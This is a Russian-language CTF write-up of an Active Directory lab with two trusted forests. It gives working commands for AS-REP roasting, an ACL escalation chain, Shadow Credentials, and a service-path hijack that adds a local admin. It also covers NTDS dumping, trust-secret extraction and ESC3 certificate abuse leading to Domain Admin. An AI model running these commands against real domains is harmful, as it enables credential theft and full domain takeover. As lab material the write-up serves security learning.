# Old Trusty — полный разбор (Active Directory, 2 флага)

Лаборатория: два DC, два связанных леса. Цель — снять оба флага с рабочего стола
Administrator каждой машины.
LEGACY DC (dc01.legacy.corp) и CORE DC (dc02.core.corp) соединены лесным доверием
legacy.corp -> core.corp.

> Замечание про инстансы: в ходе решения окружение несколько раз пересоздавалось, и
> IP/хеши/trust-секреты ротировались (состояние AD в основном сохранялось: те же домен SID,
> krbtgt, svc_ops). В разборе приводятся конкретные значения финального инстанса, но
> сам метод важен больше, чем цифры.

---

## Флаг 1 — LEGACY

**Флаг:**
```
PP{<FLAG>}
```

### Разведка
Начал с nmap на оба DC. На LEGACY (dc01) торчат 53/88/389/636/445. Анонимный SMB и null-сессия
закрыты, анонимный LDAP требует bind. Значит, нужна нога в домене. Перебор не слабых учёток —
занятие на время, поэтому сначала проверил AS-REP roast: у кого отключена предварительная
аутентификация Kerberos.

Слабым звеном оказался `jdoe`:
```
GetNPUsers.py legacy.corp/ -usersfile users.txt -no-pass -dc-ip <dc01> -format john
john hash.txt --format=krb5asrep
```
Взломан: **jdoe:<PW>**.

### Восхождение по ACL (BloodHound)
Импортировал данные в BloodHound и искал пути от jdoe к привилегированным группам/юзерам. Нашлась
классическая цепочка владения группами через ACL:
```
jdoe --WriteDacl--> Legacy App Maintainers
   Legacy App Maintainers --AddMember--> Infrastructure Support
      Infrastructure Support --AddKeyCredentialLink--> svc_ops
```
`svc_ops` состоял в **Server Operators**.

### Shadow Credentials -> NT-хеш svc_ops
Раз у меня был WriteDacl/AddMember, дотянулся до группы, имеющей право `AddKeyCredentialLink`
(Shadow Credentials) на `svc_ops`:
```
bloodyAD -d legacy.corp -u jdoe -p <PW> -H <dc01> add genericAll   "<Legacy App Maintainers>" "<jdoe DN>"
bloodyAD -d legacy.corp -u jdoe -p <PW> -H <dc01> add groupMember  "<Legacy App Maintainers>" "<jdoe DN>"
bloodyAD -d legacy.corp -u jdoe -p <PW> -H <dc01> add groupMember  "<Infrastructure Support>" "<jdoe DN>"
bloodyAD -d legacy.corp -u jdoe -p <PW> -H <dc01> add shadowCredentials "<svc_ops DN>" --path svc2
```
Шапка-в-теле: `bloodyAD add shadowCredentials` внутри себя делает PKINIT и падает
`KDC_ERR_ETYPE_NOTSUPP`, НО pfx всё равно сохраняется на диск. Забираем его и достаём NT-хеш:
```
certipy-ad auth -pfx svc2.pfx -username svc_ops -domain legacy.corp -dc-ip <dc01>
```
**svc_ops NT = <HASH>** (значение стабильно между инстансами).

### Server Operators -> SYSTEM (SCM, не psexec)
svc_ops в Server Operators может управлять службами, но не имеет права на админ-шару, поэтому
`psexec`/`atexec` отваливаются (`share not writable` / `rpc_s_access_denied`). Использую SCM
напрямую:
```
python3 services.py 'legacy/svc_ops@<dc01>' -hashes :4e631d... -no-pass list
python3 services.py 'legacy/svc_ops@<dc01>' -hashes :4e631d... -no-pass change -name ReportSync \
    -path 'cmd.exe /c net user opsadmin <PW> /add & net localgroup Administrators opsadmin /add'
python3 services.py 'legacy/svc_ops@<dc01>' -hashes :4e631d... -no-pass start -name ReportSync
```
Появляется локальный админ `opsadmin:<PW>` на DC01 (`Pwn3d!`).

### NTDS -> DA
С локальным админом делаю `secretsdump -just-dc` и получаю все доменные хеши, включая
Administrator и krbtgt. Читаю флаг через админ-шару C$:
```
PP{<FLAG>}
```

---

## Флаг 2 — CORE

**Флаг:**
```
PP{<FLAG>}
```

### Идея: доверие + AD CS
CORE — почти пустой домен: только Administrator, svc_enrollment, DC02$, krbtgt, LEGACY$. Прямых
ACL-путей к Administrator нет. Путь внутрь CORE — через лесное доверие и сертификаты (в CORE есть
AD CS, CA **CORE-CA**).

### 1. Достаём trust-секрет (DRSR / tdo_dump)
Из LEGACY мы DA, значит можем реплицировать NTDS-объекты. ТDO (доверие) хранит общий секрет.
`secretsdump -just-dc` его НЕ отдаёт, поэтому использую DRSR-тул `tdo_dump` (endpoint
`ncacn_ip_tcp`, что важно - named-pipe вариант давал access_denied).
```
python3 tdo_dump.py -u Administrator -d legacy.corp -t <dc01> --hashes <ADMIN_NT> \
     --tdo-guid <TDO_GUID> --dsa-guid <DSA_GUID> --debug
```
Получаю trust-аккаунт (`core.corp:...` NT/AES) и inter-realm ключи (`core.corp-Outgoing:AES`).

### 2. Вход в CORE как LEGACY$ (Trust Account)
`core.corp/LEGACY$` - реальный аккаунт доверия в CORE (Domain Users). Получаю TGT (CORE KDC
принимает AES):
```
getTGT.py 'core.corp/LEGACY$' -aesKey <trust account aes256> -dc-ip <dc02>
```

### 3. Креды svc_enrollment на шаре
В CORE я пока Domain User: SMB-шары читаются, C$ - нет. Среди шаров - `Software$`. Внутри лежит
конфиг развёртывания сертификатов:
`Software$\PKI\LegacyClient\enrollment-agent.xml`
```
<Domain>CORE</Domain><Username>svc_enrollment</Username>
<Password>PLAIN</Password><Authority>CORE-CA</Authority><Template>EnrollmentAgent</Template>
```
**svc_enrollment** = та самая "PKI Automation" - учётка с правами Enrollment Agent на CORE-CA.
Пароль лежит в открытом виде. Это мост к ESC3.

### 4. ESC3: сертификат от имени Administrator
Проверяю, какие шаблоны CORE-CA реально выходит - читаю `certificateTemplates` у объекта
EnrollmentService (значения - ASCII-имена шаблонов). CA поддерживает 12 шаблонов, включая
`User`, `Administrator`, `KerberosAuthentication`, `Machine`, `EnrollmentAgent`.

Сначала выпускаю себе (svc_enrollment) серт Enrollment Agent:
```
certipy-ad req -u svc_enrollment@core.corp -p "<PW>" -ca CORE-CA \
        -template EnrollmentAgent -upn svc_enrollment@core.corp -pfx svc_enrollment.pfx \
        -dc-ip <dc02> -ns <dc02>
```
Затем on-behalf-of выпрашиваю серт от имени Administrator на шаблоне **User**:
```
certipy-ad req -u svc_enrollment@core.corp -p "<PW>" -pfx svc_enrollment.pfx \
        -ca CORE-CA -template User -on-behalf-of 'CORE\Administrator' \
        -upn administrator@core.corp -dc-ip <dc02> -ns <dc02> -target dc02.core.corp
```

#### Ключевой грабль (почему до этого не шло)
Первая же попытка делала серт для Administrator с шаблона EnrollmentAgent/иного и получала
`KDC_ERR_PADATA_TYPE_NOSUPP` при PKINIT. Долго искал причину то в SID-расширении серта (это
штатный KerbAuthData/SID on-behalf-of - НЕ причина), то в "неполной настройке AD CS" (как в
Certipy issue #325). Настоящая причина - **шаблон**: у серта с EnrollmentAgent-шаблона вообще нет
EKU (`X509v3 Extended Key Usage` отсутствует), а KDC к PKINIT принимает только серты с валидным
EKU (ClientAuth / SmartCardLogon / KDC Auth). Диагностика:
```
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -passin pass: | openssl x509 -noout -text
```
(ищем строку "X509v3 Extended Key Usage"; если её нет - серт не годится для client-auth/PKINIT).

Серьёзный серт на **User**-шаблоне уже содержит нужные EKU + UPN в SAN, и PKINIT проходит.

### 5. PKINIT -> NT-хеш Administrator
```
certipy-ad auth -pfx administrator.pfx -username Administrator -domain core.corp -dc-ip <dc02>
```
Ответ:
```
Got TGT
Got hash for 'administrator@core.corp': <HASH>:<HASH>
```
Мы - **Administrator CORE**.

### 6. Чтение флага
```
nxc smb <dc02> -u Administrator -H 4881205a... -d core.corp        # (Pwn3d!)
impacket-smbclient.py "core.corp/Administrator@<dc02>" \
    -hashes <HASH>:4881205a... -no-pass
# => use C$; get Users\Administrator\Desktop\flag.txt
```
```
PP{<FLAG>}
```

---

## Сводка атаки (полный путь)

```
LEGACY:
  jdoe (AS-REP) -> WriteDacl/AddMember (Legacy App Maintainers -> Infrastructure Support)
    -> AddKeyCredentialLink (Shadow Credentials) на svc_ops -> NT-хеш svc_ops
    -> Server Operators -> SCM ReportSync -> локальный админ -> NTDS dump -> DA

CORE:
  (в LEGACY) DRSR tdo_dump -> inter-realm ключ доверия -> LEGACY$ TGT в CORE
    -> Software$\PKI\LegacyClient\enrollment-agent.xml -> креды svc_enrollment
    -> ESC3: EnrollmentAgent серт + on-behalf-of Administrator на шаблоне User
    -> PKINIT (НЕ шаблон без EKU!) -> NT-хеш Administrator -> чтение flag.txt
```

---

## Тупики (что пробовал и почему отбросил)

- **Прямое владение ACL в CORE**: нет путей от svc_enrollment/LEGACY$ к Administrator. DACL
  читаются через LDAP-control SDFlags (sdflags=0x07) - у Administrator/DC02$ полный контроль
  только у DA/EA/Builtin-Admins/SYSTEM, остальным - read-only.
- **Golden Ticket через inter-realm ключ**: `ticketer -domain core.corp ...` дал
  `KRB_AP_ERR_BAD_INTEGRITY` (KDC проверяет подпись по своему krbtgt), а правильный cross-realm
  referral-тикет упирается в SID-фильтрацию (trustAttributes=0x4) - чужие SID срезаются.
- **Schannel по LDAP**: TLS мёртв на 389/636/3268/3269 (StartTLS -> LDAP 52, 636/3269 -> reset),
  поэтому cert-auth по каналу TLS недоступен.
- **LDAP-write / сброс пароля Administrator**: svc_enrollment не имеет прав (ldap 50).
- **Шаблоны UserSignature/ClientAuth**: не выдаются этим CA (`CERTSRV_E_UNSUPPORTED_CERT_TYPE`).
- **~"неполная AD CS"**: серты KDC на DC02 в userCertificate удаляется пусто, но это не причина -
  KDC Auth-серт живёт в local machine store; PKINIT работает (доказывает успешный вход User-сертом).

---

## Выводы и уроки

1. **KDC_ERR_PADATA_TYPE_NOSUPP у on-behalf-of серта обычно = неверный шаблон.** Проверяй EKU у
   полученного серта. Если EKU нет - серт не годится для PKINIT, и это не про SID и не про "KDC
   сломан".
2. **Перечень шаблонов, которые CA реально выдаёт**, лучше брать из `certificateTemplates` у
   объекта EnrollmentService (ASCII-имена), а не из контейнера "Certificate Templates" - там
   есть объекты, которые CA не выпускает.
3. Trust-секрет извлекается DRSR-тулом (`tdo_dump`) по `ncacn_ip_tcp`; `secretsdump -just-dc`
   его не даёт.
4. Вход в доверенный домен как `LEGACY$` (trust account) даёт уровень Domain Users - плюс,
   дальше ищешь специфичный вектор (в CORE - AD CS / креды на шаре).
5. Креды нередко лежат в конфигах развёртывания на доступных шарах (`Software$\...`.xml).
6. Shadow Credentials через bloodyAD сохраняет pfx даже когда PKINIT-шаг падает - забери pfx и
   достань хеш через certipy.

## Файлы

- `scripts/` - вспомогательные скрипты разведки/перебора, использованные в ходе решения.
- `evidence/` - FLAG1.txt, FLAG2.txt, enrollment-agent.xml, выгрузки certipy/LDAP.